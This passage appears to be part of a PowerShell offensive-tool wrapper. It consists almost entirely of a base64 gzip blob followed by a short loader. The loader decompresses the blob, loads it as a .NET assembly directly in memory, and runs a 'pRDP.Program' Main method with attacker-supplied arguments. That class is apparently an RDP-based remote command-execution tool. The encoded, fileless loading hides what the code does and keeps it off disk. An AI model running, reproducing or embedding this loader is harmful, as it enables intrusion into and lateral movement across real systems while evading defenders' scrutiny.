2TVm0BK2LCIbsy+2C7Cr7dkly9waOqSnU7FWkmhA3Q5L+Yo7o+RHoglrNyADFuNG1aPIAMl5WvxFohF1u/QTHP0E9WDt9j9Bw0+QFpKz/D/Q6Res3eond+w/81vq16wmGTBtYYRgVBLu3eIvoe3/1LPQP1t6UPV85nnOuuIv72uLB/4OVD3m3agKR+By/H0jajJgcu2fGh2oPbaokWv7DnYXDZqw2/9LAPacrJOjDM78NvWQOJFjk9rlymaTbidFmpAmazpLdOcxZ+guw87f2/vbxNhs0axTP2/n2oI3PDYKsqoj6g7agjtnPk3Djb5N/Y0+9GotyrH4qXPKsTXWv3YXIoMOeHOS6NKoZM7yZNpKiknzbNFuO2KKCkeiCcbpMWKNMgtpy8ozS4dvqNXEmegqSQ0GSvd9CmsO7eSHDBRU0nsAH/Zhjs7TG/BIc/vBQj+oRD08WhuR/J9XSoWwJYGMUU8sRKpMpo0Da/bTh+QE/cJEkQRT3i6CX5fm1LXrpCn21alhlg45b4yqcXze9TdOPAN57lLEkBHkuR72ldiM8HQhxNryNE6sRVmNNrhh6wvrqQt36veERpcJlw5w4zx9EFVQf0Vqpww0EAPJtngyY+ymIBy6OmiDD7bbpOeCtqWfJsWWtX/QCY7CPtGINRGrUPpXMnNSi2X8VTSRCaKSSFUyGpVI/vujGFeWOq7ohxjsdgZsOZW+pkwYuag+tUJRCDd1WmEAJ7VbYQA78/QsZI3TVxodPwktwhl89AaWu3bN8UzNdp2/i5dNpuo4dfVUyxt5Z4YTzoz77A0D7OxFGexIWypIawTMawG2TN9Yu6X1lu4Z2TbJwTs4krRrMxhAbP3M9GRM5tSe98BYxqFEofcTOqm7LFp8IS+yJEx2e9Fo4qdI0XOu7s7GO6IxmsLAZPJvUwNUT+k6FG2aqFMAGzx177m+tuiVjaKd629Xj1o70sy1xoe7pT8zalaQEtSGmvZUZLM8rd98r+wEq5jpqj/qa6LkNVfS/FJvcQ+bBfGREpuW06bDxopgMldmsUNFQDZYO4lKXZ/rpql4RKmqVaOjNS2pjgbSRHtWCerZObJwpxHN6fL8wU2UZTfIdFZllvcE9vFG9AfJZKuGOb21FeWFBhU+C4IU1S8btznRZ5HFMHpXTOVRXBekx5aauYxOQhsZd615vboXqPtVoKJV15LID0/HNlzTuXjKm8mTCyofK7Uf7aR72RjOe3YdmAHudW3dFOMCqc8ByxWBnutiirndlBY7BR7Put9fVrT+fLcIaVpYL1Zo7NSZKS+n0VR1FqsorzJTXUCrLm/bVVVV7yw/LVdX1VkoL6/4BCsiyTq4IxhLafRUndEqypP3190G/0PaK8vbLj6JB/9MOmnLbb2hdGm4CbJ9BclaxjMIBHyX1v+UrWv/k1wpp/6tJlWEW+64FiUxC1u39OyXGMtY9+lpzeaf/1ucwV32Vi/kfHLKIpXbEyj+6P78eHmea6B9Jh2lzr8AqjxUk/WQqie/q7pXfwVlVY3Xyw0f/CrZu62cM3Bv+jxGNY1/3pq7L5p38mpNqYutOLgvrph9mrW8Z1Y1/xXenttK4Jfx+imo/yvi/1f+X5t8vN7KVmpYNJMWcBtpkVr+FpUzZ/2p4/VfcY87WNFs1UFx1c75awOwShasc1hL4FotQWYAUkecZkl2EVYmyGWSqvzFbz6Is5EatJyKuOWmSKiUc0V6+KvU+KtNDfXly6j7+ErErBvLKUdqYcVw4sJTGG4XlYBx43KjeaavWdblL+jMFuS2KELMYjXW9pLJUYgH0JBV1eTJPpA3469afaGJTd6NX/XIkrm4zK1ixdhSznhfAa4Q8NuRIwjfzYtztRu+mihmvIjqcwHkEDzn2dlCUnRtO479nP4WXX9N6tHZKSya5ir7nAaWrkeNAPWNBIgkGBu/j9K/7+8Dn5jDPjomOnnCOqWi+bvpJ7fyUDbc3pQrDHkDKovqrBTlDESMkYsUuyNpNqoFH9G8A7MkPxJpNsSu/JfGDFC8PIiS3DsIhT8gHW2hMsJQvPjAKsKuTpTNNz8nWWFSstSERIUFqfzXtxVQgKGNEFv1tLVc/pyXcGqrf5NGN5+Dbehg+9dVWTBzdf0VPHyXYPfsGU3XiQVIW+ceTZyA4uhaOYrlWTwvp6EfOL1+8BdPU4duroUvYLS7be5a7LpcIRVjL/uaOYZriiYY0rJ8+WTN/LS8YwLYsMV//fBOTU+B/cdnsZGwx4y5psP9M1auzC2+ljW5vscNWEn2MEvKcoQK4pEbvQ1encjwIxmsRosMvpT8g1G5F7jbJ1bWPj+/Akt+ymk3DORy4/8UREjpatBEGHUzSn4mW5U4OEu7jYsSETu6V8v7bVPd6n+JXc1nKiz9q5s1s20xKAHdvMOk8xZ0Ov84GYdDvEwfd3uY7iDqDS3LVZVEZOM7wkF33dRhV8gi5rCJn8hmYL0nTRXQ3F2ESgdoqnUtRicDdHR5Bq+T8owPzW0IsZc3DnPzopD9YOuoXCC1rSrlaIYd/1ofuJ+5j9MAO70SZoBOzcGsbSQTnZvOSOJDXvoIxKS2hl640Wh2B7d+W2jcgxELHEZBuAOK4vDzzoQgyjfs9KNYP10PfJo3n2bnTr+y7dO1yqe5EBILKwSv6nELT5Dj1S9BxtZsu//vMaJ8407/Wd1Ov2X3J9vmHztiFtst1/4PMtARhgtV6RzA7R/4wXf5n75l7T9RfdzJbHf9CerwJHlZu/+lAouIginoLK+g+L/sXm4Xn2UXngD078sxl7UMBpYq2csjWH7Pzmx/jhbktW7yXZrDyy3iMxiPfuhuYt1MjN0bXUfmZjHxe/q/l5kqMf4eDlPiY3+QqxxZJdId7osFiahZs1XCw1H9RHlGWWNVyhrUKOmSw7XjJZO/6fk3KOE7DOYrYAsHE8VNUJdVxo3QFdcqLJfv52qWl5FmSGeUkaZLR4zuJwqzl+0nKJGX7ccroVMZycpOTQ93ziBzZe6CTXtHFpIxQMUN/O0NwKjnwJto3eFscKTfMW1xde1YFdgXn12NsqOO3IThTEO4KrCSEq/wKjDz8dMLxk8w9bjXSwy53O9vDm3WnXwwTex8NtMb1ypK+9iOs2PeU9gRJGxd58SVl0m/xIMnv8MWvP3227yxJ3LhVkgsAwpCjI83Y+LB9kjdgJ17bfHhUv4RaBIAxp0Ld4nx08eRHxfVWiOWN0elyPEmTWZ/b/Ry541sTB4dkPM9wNKtfy1ie8T5li8P80CZBjNMefGgptcCki5us/fXBFKbKBpYL8SRDetxK3HbREnXN+kXYsqTyLwihoCELkzpF0PKk4r8ouqQhC5Y6RdqyhN1OlFdPLHV5VQRKT0wMprR1hvYT0Ze0Rak9MvFJzHof0T0YjZasFzTk5tKMHqiUGELtBq5bQ0ofox/2s1+CV3Y0i/MlKNpqshUHJot//ujYNwx/98mgZZ0tyYkpQdH9vzft7TcAkRwkrSN2405LkL0+pe9oz12LQVYMm/IpLsFhYR/O8SNm7xNGwxzuWsZprTDsCAfF7Q0O7SD8YP6G75QoHk67s4yxf0sZ0RGRSTkmFq+WDGsUpE2aYb8n4Ui2IrGOouy0n1p6fK8p7GyZMMEGrJgYWRqEv95dSmv4AZbqpPgAG0yrQVkZTI61QQlMjJVZCXyV1QHeTJg0q0c2VmSgxzRcBFzJVWe9HjIjKGLZ4M+j0SLPzzRLzq+H/6xghD8X5Gevoluk/wIjBWE4//K9vRtfptE4ROB5A8ol+2tKJQcgnK4RqLskSDj4tAF4/+K9vStzS82j+/pW9I/YkFDiBeiWxOY/NC/dfbrc52RXIHT/xM1A/unaLQdyFRBqlQV8a8nixNO//s3A+sFcdEjQQj1ucJ2YKSSEyr/t8C0s2//15Haf2//7bWQBP5fvSAsrnurw5YOg906KNRHAqJOdaihCNaZFOSrvhD443pdb5GYMdLpxXz7I2N5EEkhXxE0WzZPbe4eUo+tnLOelIGjHRlgyfqt8mtwW6qFQzx6UqlZ+kuyxeKiZmOxeLKlchn5geWMGrZKFR9ahnIpG+SpVHEGqkVZsTSyBW4yskKkS7KGerhTMqd6uEN6nNo3s2Q7NViTZAU1WKPgnmRYrWTSAzr6v92MaFNHd6/yQC5YPO2+DO0UXCz79s20HZcOpkDd3ZngrqxuEKnM5wmf7leklXtCyOF6jke2ayZ2c6GV+++Q9ploLJtIHJZ1eJuJkeqr07QQv+5oBKyDZhTrtJQazRIRaRvgD+dIVg25pX7ZhqLLsppKm+GC27NM7j+/Yrj1fHov4U/TwtQTTnHRu0tdylZzt8dO1nJ2HTi6mQJTGgxmpcvsSwL1Gz/P/fQAjUZOKbVOj2rVAGbHBj4fNeOYh0+5GOil24qaNnLigLLX8GZtbuuEmj4SnZjxBc4iLSXaxj3zdtBhTVU4dkHXIBNfTI1tMuz46pMfAd0dWAKDBJ7NhL5rZSM54Kg7EiWUWiaPj+rovIB08NX40d6JKtyRVOnmZR0l8WLWDkGlPGmcHIYmMN1Rof5C/zKlAXOigCTPeqiBks6C9xyvMijdzG3l4dSNc5a83lzc2xiWZqan7c9On1Jn1fLwWZh3R8xn5efdgfBZBXl3yC0PW0Z7dyx+VpHeHdE1sUtfX91w9Alswc/3+L483OB/+f9M66B/hGawhxv2Hv5N8uXhNYjXaxmlfEwfxQulxmF+XY5PUox3x2Rt7CPh8rDnj/M950F+XfX/vynMZ9Ne/s0/n01RX90yfxPYOn6CAd4dsjWIEvPNgky4BlvUC+AGBFe9n5HAv7ptfFb4r24XtbFLWJ+BGBLISen8XwiD/+ng/tO5AquJLRnih5VpgojUVPrKSzxmYseqCTeCIxyKH1WfQAxY40+P3dsbdGjqmRNqMFGQYSRNOb9DWwhntloydy4bl1ZcS859OOO8UDNpo7e1auOdcU7PfzUUWpL6mHJ83DDdbp/ock1z37I79dpLv5JLXN4oKeABUNqyUnXsVNocja5cKlciMgqsGtTVH5wbN6ePQ6d5n3MDW2b2d0LqfTMtauSAtjqHs6tT0Y25JxYcrgvOX83mYLKqUJg2SpTb5CKdcjaO+SVmjH0K+tcHQhK/4wDgnQKeN3o9TCc6kaw2fzy6hFRvCB2DE44g2NWQdZ2FXOB/yXUeNMHprYC/iVfhGbEbwTbQJqB7BFZwmNMkHAS9ppb0z3Sud7t+HC9aMW92M+dsLlIjRrm09k06t5DYXMCHimhWqmkncmGrXc5EXdYDpKpsZyu181vJ85SnX+t3wrRdpaoQNkxTVZNIYIXNYkGGMta6iCOconcHK5FLum23MZOryTQ9NBUzJsXrI14/ZqyKexxohAonx+nSVPcW58ZPOm8cGuex05PDaIIKLWSrJy4XA6uEx/YKPY7n9s5/pFlGvA6PHlOlnQxVOjiG//kzUp/vT0adUJ4VnbW7mrTOgtUvmBZ1LRY6iKDn4LBDPb2Dl7T0x8mUXmcc+5DgXntYCUi4tRtzW4/qxKpLTzTaSPUcZZdz+GLmC3FqVwov7S8IpJB4zGdu7qnLV1eIkVxdS1YgLLQdtEHE8jUaoHax9vjt0uHbwkNC7TeFpp1tIPTYkFWyDKXPDKiVj22IS29WEj62s0JUgCo0uAdHGuTrDdy57o8+1BLsvIzK2ElqWQ2BtGZLS2DHbsizGZhH3p/cKAKQUHI1M0SwBuT0BYEQqJVuC82VDErQyoJRWcEVl9BPxCDEcuvfq+7YdK3b+FPtvRs0oyRcxcV6OkBksZ17B7hWdXx149k5Vz2k43uFimy0ndBqUxHmLOW86AfQvGQskGiunOBU2Z5pcLRfBVnw4Bdv7jAhPcfk5ZIiS9fbBlptyuwBCccBxS+T0p6N2OSBC9uHhtpBcxGXwgsVRL6G/OXQYhLA2eJFkei3SWkDUvzYDtRQinL5XyQ5NqqEeG0cBEKCB0QVw/hgzZWIDdtmgLy1sd5CA7IG5jwapoPfLMlhqJFaueE9k1cLtBKEuqQ3z7U87F9qR2lunkfbHwGL7te7loMqki9xR6QChZ/5Pa86A8fVSs2MHrypg4kf259P3EV4HwMKaIG2B5Zz49TQwp0TE0vY7kGAG4Uhsa9gQMdmHYXjCUFyHthRNrAnpju4U/VCo9Jtr0eoRSxl6U1BXCycNMf4fAODCpmYzJmjh02W/y1bHuycI5Odp1xgTUBXNzROqFPtPEq9Rb4rWTe6g5tHN4Ze/mh4P6ZWe0SN8hoOWoOXDa8Hh2K+ZgvyXdrEtUInWy9Ad8Z2IV8EycWpQxNtTHg9u47zGK8elacjU6/FG8svchHambX3tbHW+ibtVBHmBrlWwY5EFD5MfwU8EXgyA0H6USe1mfStcRGl217WE0jCpT2kPIr2terQmiWgQvQrmua0oBbC2d94JTbuDpaQJsinr2O2P8FGDxaOJWV8tzGtS85EZUJpLg6dBKUch4It9Nrv38IM7JSgaXSdMHtH6p+V1R9tzgfVh5pZD90tONPNrq/myZwaCRoB78vPKzgM3U9jrqDzzG6n99DGbIKPEUdA14zPPQC8d/FERkuLB1FndZPbFWEjG+/bekjPhaMpvbWem5Pp0Y5MSdOUjls/+5BNLt93+bUjBu2Oa1Jy3tCpB6xvPJFBJc0uTa4uTYDzLG7HHcWn7NAtnO1HCBB975XUUyfOrQB0N8t1oEPjcO4HrH239HouyeVS2KuzHQPvB7xSMx6l2REujBsaeB4npdMR6MF95LflmX1mC799d2bLFYmN8HpJuGdwS/tAp9A6IvIj164PgX3oAB/pZVCL425VmGdsCwFf4CUQMCfAMCsgIPrhlfX+DPEGlHo5Ur4DlJzkAqYFcot9+SU+vHLe3U/mEVin/u8yz8Kb5eQpsneR3DuPG1rpHQLjnmXC2Po26Y6eM2WIBtCD2EIpAXwB467OA1JzVxv0d11DTYBp360N2KJ8wFdC3NEZ3UPAdPlveKYMbJBcSuRXOpqajwAHvONbCCguKaQKPAfeKO1zKS4jB9447QXcH2ax9Bsd144kOwE6QcT0Xyus+d77KKZmBY6mzqdL8F6C/HML5HMLxLpF1xn0nRk6rpkdBr8ziBQzJCDrEl9i1HgTOkm0f2N47xs/9konfYWy1/N3AMys65JdWsZ+ec3Zyv/I7i3PLnn2Dmyp/vGoutvl4hG66H7WB2OwkwhE7Nfgav1GVx8or7A8isAdq0RsZeHkOj1ot6sPna1/IUcf/xO0pOPhdkb7JnF7I3VNf3O1S8gjgXNRO3y9UztstoKym/AAJdA2khebOwGYFTDSyF37w/YrPqOyhilePxRZv1NNA2l3vX/d1aWUkzP0DRKRsWq0hUTW5dZ5NyGF9xndYANl7IwiaUmesjpXQVcgv8NH2P0t6PZlVOYOgHGc+zl2DHMCen98u4Q/flwKPHPbS9lOMzNkdXz1drnsG7XEkOtyf6BVw+N6g+B622dz8sHLti0AZpZM8dr0A0K3XPuvvK9lth9ZQVU9thg+HNuPQk980N1XgVs/fEKvM3tsEbrRQJe9V4UlgJ5jiSMxJ59v2bGFQBgn/vCpkulnVu5coaP6Yy+EbEAhEBmhIjJuTvbJGxHED5FPkXYNgZKj34fy0y0ARp5xB4ac1x0mmyEPKOakK370ORSQ2dWGTaZ+KM34voC9K6KCiBYMepRH6jZb92PagdxuRs6Pp9ApM0KOKVuSaj1eeYjzwTlsFTgJUn6bvb0psdl5QLcdturoCZ1T0wxXMAJUzmdkLMe8UVMI3KYz7njcsXlASu5VdBO/KXbukuleOHmBoCksJ3xxU+js+uMOhGyJ6Rm5fEf8rK2PtD/WnT5nu4uZzZsNb4zkYGT312XDAk4G1ymh+FCA0Ss/ZI+nuymEpyambWg29OvA1QfPpgYKunFZ3GE2T3OBO88m2z98AjGVuucDHgIPwgzh2rL9sNkUvtfe+UpaopmX06a7XIO8JelHRIdc/byILAAEYJZxzhITgGQCSAnkHeI9SjuKZQS4H7YK8l5tzm7qUr5HrIS6rLl58AoHWooq8U4ldOW4bwry2m7M0qO72/10EX6xpp3UCjtay/8qltGuLybw5m+KLOt5lfJQpanGNsen/Rd9T2vYPbkr++AFbwIIAewId6dnBrgyA8gO3XmAHcnum+K8y5P51j0fXUuOwlsXK2UnD8RaiJ5dew/gGw4JhDGSH4YJLA0GBMTZWYJ0EaktXs7uv1sJNgvjND1LCAOEbcyaePaIML0aYH2sMHuMzBkYf1eYYobPRBqSXJx4VK69TTNbCUw3bKY8XBIv8Sr7hXkGBioSuAK353npnWShxskOZF7KwQ9bB3lfB8BRrwoBW2I5H8cpDzHEvjPOkExyXpapTQ0cGEVMnRzpX2QtGpfa3g4PTG283B6H7jWvky0BHblQvkcpD+KKIoeyqGnxeNxq00C4/pOVeIxHYQo4D6o7+dVYWcCSyIv00SgN/Ep7TNqRnzvzIZdRDkX6ER6kusYfDDG5rDuvcTnPpr9nnYwXmZ0js8r9/ko6W0VJ9nEtMdaZnQpX0Hxr4RM5W4+VurvY4emihMwKP+NsFgN7XHYxy23F+HjgCKNxTjpJT6Hj5ziIPoJU9vgrABJpRwxMAD2TnO5eXt9Ed34Ar2+ku0+lG54yIjJfdECOJbcL4IG4ELrD+r6vR75v3r5g5E4SeDF7+Eo9vmuafkTAAhAwyMn9neM7xvsR5f7OBfSKdvfJcffxd/eJd++a4v0IcH8nA4JoDp+hgKAzZ8TBKnBepHs4lKA6eMRORrlzXQjbJA3FboIicilmE/PuXHcbFkCQe0ya6Rgvy2E6CwCRERDgnjJRb5jz+7C1n9c1/QgfCMI6fKYEgn4dPq9NAD+n4+8JIEba0dwEsH8C+DlLMdKPWCaAhRPATwLNBFA9/aiaCfBJq2YBbBnkdI/zCkzx6hnldA/z+ua6v4MBOyZ4BXp5BUZ59QxzGFgA8kwAeRYAgBGgHgbNs7GQ/S3Es9sUsnaGJJDqDr6wpN1H4LZgvm6DlCBF/NSjCe3BCpxKBBCSbxXCxyflxMEu6HtGtfP0l9eyvtpTyGqYbyuQyCr0rQjDrUf3Dz5FvPVJCsGfpNljiSbLYR95RGLM4bade+H6q7vZkXoijDXYia4/nTBOBjraR3VYLDe7jDHIDAGwkITsee89XYzEsiyN4DWMfT6nZhm1xZ3NSVLmdGqkj1Kb/jOItZomCX3T33ocYPaWT7gYTTqmo77yzFgqNSe5UpGMM/1dPt+T0ZwOc7F4DPhhpL4lCc5zvcF6/5LEfK/UL2PYbiqGryBO1BCe28Y3x/HyxhguMgct7ShzdhPBenCFElRrjf3EHw9NvcoshBnatDGnvGTXP9JMxzBG5UxxrOVBcOcWtCA5oTstv5tz8OCP8bP/ai2PvOt7JZQN25hxQIEQ3jQLkUTNu2HcWzi09TJ0VQ3tuB1u4Z9v41zw0r+C7U/dEK4T/bMsz3oiwOzgr2UwIf03EQNJjyp7vgyiC8kH499hlfp0YmjkeSAvPSAz3INXM5iLyaxHMIZttg9CxSMNwGhwIGnU5TWdL4Px/Sihuis/KVZLws5H2Y/af2KviULQhkluUt4OklwiKZXHFM/P1OgqjMyco270xxFGFO0K/o1+5wpXziOd8KVlK/TGPMM/cXX3sAEquVKJpQa30zQdyu4PVnEnpTTeNPjbCBNfTbqG42lcxeUvHwaYDoiX6dBTaO9maGLCe5Sl4qSCw4biyefwAq7XnnNvjEoIQB0eK1req1KprgBE2Z7maBt/CEbAiT7XCDi5S/XG99eUlcg3UXmrnzmH8LYlUrjpNusyP+MkXWD3iUZKdPfdqnB63AjdI7A36RtTfg+XHRT3SOqP+jGK0swh6qOSGexDKXDNRQ3A26bi4A+hhnEwJvze+iJo5Dl9nYIFjoNlDyutIU9bmOdE+521zjKTcJ3X7I2SEUzqhP5bAOoyQ8J1LYn1k631geZOc9pRc/qRa9qRa+TUzc8NOBAmRIjcAG3YSd5VoIod+HYOYyPfRqlz4RlRpiEHOZET5dkQo3A+TPoHsrJM9wRvNepLGWKlMZQZdEAeJHszeA/SNEQVfKU5qaKhKHvxT6d+OGWOk0HxL0mKBDhzkEglON4CjFFdBgdJ8cbuPsjHfPrYBMOxS8A5CLdeNkFWg3ZsriVO/bBT+pFRiAH6Wx5qFn1fjrtXmA4tM0z+smvLysMPf/d3HanBITVUP5fvs1/S58EODIp1AQu9hmw9cQ2zcaTPHLQX1YyAbjpmMC5jN4QGN+SvgYK//bgl/W5e6f1Z9YVfEaRuCX6tfqgUBY9JxFw8CeLm/YXdxmEN9+cesc+n6Zh3kUrQMzb3/Sv5PeoI+q1rA/iC34CWts9HACesgOu9AZGdvBpPhc8hF76CwgJvTVmFIaIZx0xI399l/qgUl9NkzVOFtv83ZzkPiKwXmhPyp5nkeI4Q/rd+7Q+FgCoK3S1UlnYa44ePSc6Xx7AjqR4LsuWJDVHJaKy5KP8DwWMw/oDazVCw7UF6J0O4vEXEvGjz1+6x1eutaqwvEPE7L4RsOnj7onAa5E6C8RllCJwq0FD6oEVXQfdng2VwR2ohNbB8G079BEhuDQ4D2Bd64vTu+OTbQ7ZQjbznSogoyprUPFRMG3+wRel1V8FbISg1YkU6G7E+f/yIF0bCL6KFGrB5J0I6WIq7hgTcf/aOSEbh8L44myNOiLKanv8Ygxj5QR5+Qt5W0p7CcEklv6pMsD6ld+OZduSZfvSZPB3Xzi9k1ZuvfRvwnY9J9dUEQ/WHyRV/YJvPIhpGkj47Lzp8pLu/y8wEqX3Vn/siB7TSt1+TVBLMSUGgPcW02X6ySdonHoBwgiHG1mBl9kO2wjEKLTpaBusRQOWqnbJzgQuhv/sDU/71FgIJGUJBPi6ny3QILMo/azZkB6sFRlJKNLEJbI939tWbcZAO8AXYB+8Uq/KUXXl4ZZjjygLwzAhgsZuelcyjkAlgifnN+HTbvChbg+XH57wB9rwfqHYn9Ncv3FScXiM9Dzd7/RIWGXHCZZpPDtY2mhwtSgcxqpoSEh2SZjiuJk29abuScpGuZsgJZw0AwQ+PMm3ahYhedsVt3zPWIKsQyb38xz/cpSbYBcHCfx4ukfAej8KerK8ntW55PMh7s7ZYp1w2W7VrUSz4SwD9kItA60Ycnj0QR8NoM+SnsuB34cJX/WduQgBy/8Vz1Ykf/HFISg6ULrYC5LXsYvRHslvO8qxuN72fzewgwGFGaNU1f86ph4NQSIFJ+Ltwc58dtJhloIU9n/o6hk8ZA4iSUfBPJh/D9UwCRDrcbeUW+DWEN7LYG+UUUR7M7Nhi7/SiEKWIXgunKYQ4jD4Nybw3wc96wXUM/wYG+uyxrbe/E0D2/53FeN0j7JttMGuNd+3kFZh4oGB5zL7iVQaNQPaPGo0NzML7mSoug4d/t8XA/sLzoo+jEZ/pQdSDV8ApdoGa5K4Wq0MDZf+FHOfaChNM/hRfkAhHUGnXP/v84GK/GAbBU3/2WxSkX2ReJR/fuXsb4m+YEBjM1QwTa3P5mzFWJ3ORTg3Wr2kfLtgFZD9KWs1uvFGZifxoBCAmDfYLyBaVv4j9SP5aJP4F8ffiWeg1ORUhEbR+GBXY9xBdC0iSE89aW83OEQghxD4IzV5HQhoUXbqbXf6ahP0NOC5GSBiIaPB+nq+ZkDt/tiKVMFRjV5rBMThVAbK+iHDd08HiFyXkdn7fk/LRRPVXNEwgdA6K7H8aYOOoyKPVIVWqTBuQYxL6tfl5OuFYCWyTYBQ1f38ib+ioYe/XW/XV2ULNIiEBzPQWgOPFWh0OQqUN5v148Zh+pB0WQRiFVjxtFcooaAm2qTGY8MODYA82B/t/2q/WoCauKHxDAuIbiygqljUtWB8kCFrREhBEHhXRAmV0KMKyLGE12Y3ZJCVWJVTHVkXB6qDWNj4qI1hGwCJVEd/WaVGDj1ZNi9baKb5jjfKQmPRkeRgoffzzR3vu3Lv33PPd73z33MxsdpW7NjPr3tnfXHk7w8umDpp7DTuRUuo7fF1BkfNIXHBo15U8ZfWJq5rje+4eRGt0vGNBjy6E/0DoZmwPSrjyRWCRbe23B26k6W9k6G3w72u51jravGSN1jrUbBlitrxptgwwW0Rmy/wdNQlpSUOv9moOzD0fyy/W9+23nb9St+xNQoJG2bzm7JXuH/dW1O1xDYE/ZfYVPtyXeys3T5HiPVqNex4vd3nIR8QdXdn0k05evOCncQXvTFr6zpg0SeLRU9efeAcYQtP1ZQGGTVsadm9ugA8J6ce7963GtAt9By8pv5C7aPF2EU89L9L7WPDmifQNjVfo07TDl/RW56Sz4gCDIdBwZfW6318546Le2tjv82k+no+XCZaL+giHnnrjybqoHSfFFZX2t43bbDKu9PDar+r2HA2/fb2qqKZo+5fM/V2VHpFl9I3x1+4cq62gfA/scw3q/at7Wq9yeaznpaWTB5S6SQVuFRWLrWPNluHmupyB652jdmJN/QmVv26Q/OGtBRfrbtcbJ0f665rUrWkFZb6SqqIHg5M/rIy6dsjnedOp/OD45m3hNp+1rab4sKab2VXRvhu+zD52O+tgaHJepCxnfWOrqU5Uk7/tuLe11fbIO4W/NPySvuyj1wbe+Uxhgc/WkOYtUcraVdZqVZ8nBxpLq3Yv9fwpsXrAkVrjpAfDso/0o70tzabRcbZvbDtaZO8+ttxqcReVMlcWbHHbI92fW6Vb8o0xYkSYPuEBlmrUfrLrEK+C75oSbpmWzKsfn8p/trnx4p2GryfkS1xTp51NrA2aIonKUjUblrulfLU/+aqLcUbxhcIh/HODLJOdnnnM8z8U8d38M+diWppuynutiKulrs/MmqvtbSk0hpScORxvmLnr3PtvVxpOMLzLC4fzS3vXNFNGjwc/6qwBJe4X43bcjylxubd52MbGjRoP488ulvToKSubPnh7hJNkZL3J9+lhp8vDvvXxpR5u+DTTOGreiOSjhk/XVVnc9PnR3vXnN10SrZ9//FlKrdmz4SlhmlxfrDec3MpQ1Ss0xSOnJ+8dK381vGVm/Nbkgl9CLhOxi6UuY8rzRq3wKrgc9XMy77RXuJjnV1iJmXQl178vPl39sZ90Q8iewlRTyeLQ56Fmk3t+wazRplYip86j5WROjpvNKkZdza2bf/WxoHP+2D7HUI/2qwMOodTpjHJGNjkLp2gkZwlGSZKiDJmMi9l8EDatZ5L/nDlx9cYQ0nnCcw48u8Z50BAK6mHdbt0WO/FZf4HP4yNUgJyRxelFxOI0EcYklIBSYZyB4mEWg2ajOPBjYIyEud1qBCZrGw+vC2douydwiHRYBLeWhHCkBB4KyRAJnDTKRAwXf53blQhRHFZZiONIBTgGvDYrF7znZOdIgHUlRGgk7YEpiMP4d7aJKB1GhIZz9ZgOGDk0EvAqyNJmQoeYgsuvhdPiHK7DAqBWvM58EdBZRHA6FF10KqBqEfbbA/NHrg57kqArYdcL7AQkAkxHt+foDfgYTpsdS4MGmYOSDm4ReNnt2qLRK7AnFjwph7afQgH67cqkcPsqwPx5DUMl0DHI6A8qpgBmLFeDFzxtN5EBvpy7s4Wd1UJoKqdzdjsf1a6z45z03+ody9VxDuxlgF0NNVR1qbVj/SZy9euK7V7F7jUM4vaEAYLltKeDJi2c9J/2fcZ3RncdfrSm6qPBodlyGaYhlSzF0BLhBJG/ECNpgsmgaKlE+G5ipF+QEGNVOJ2ByxialAi1JCsMDenfp3+fYJxlSXm6TIsBBc1KhGolPZUlskg5zvrJKULJsEymyo9g5FNxVi7STBBicpymMklWleSYD8gwrJMsJoOkVZRK20WTvQkxGpeDgFnaMIVCRhG4CqIiXKEQitsYVEo1q4qhM5l/qSegLTPsZElCrYSc7T6sKMlFatBJZsxRUhpKRkpJ9l+yBgo7WRx54OVAqO2KY0kNKcNk9lEixNkYWsMsJJVCTE2FEQTJQoJMXMaS7YfiSMQ9qOmQLu6iPVjcWQTwg8UdRQ1BL88eCVA/eAgCX6KG/+2l2R8AdVCzAN4EAA=="))
    $gzipStream = New-Object IO.Compression.GzipStream($memoryStreamInput, [IO.Compression.CompressionMode]::Decompress)
    $memoryStreamOutput = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memoryStreamOutput)
    [byte[]] $decompressedBytes = $memoryStreamOutput.ToArray()
    $loadedAssembly = [System.Reflection.Assembly]::Load($decompressedBytes)
    $originalOutput = [Console]::Out
    $stringWriter = New-Object IO.StringWriter
    [Console]::SetOut($stringWriter)
    $programArgs = [System.Text.RegularExpressions.Regex]::Split($pRDP, "\s+")
    [pRDP.Program]::Main($programArgs)
    [Console]::SetOut($originalOutput)
    $capturedOutput = $stringWriter.ToString()
    $capturedOutput

}
'@
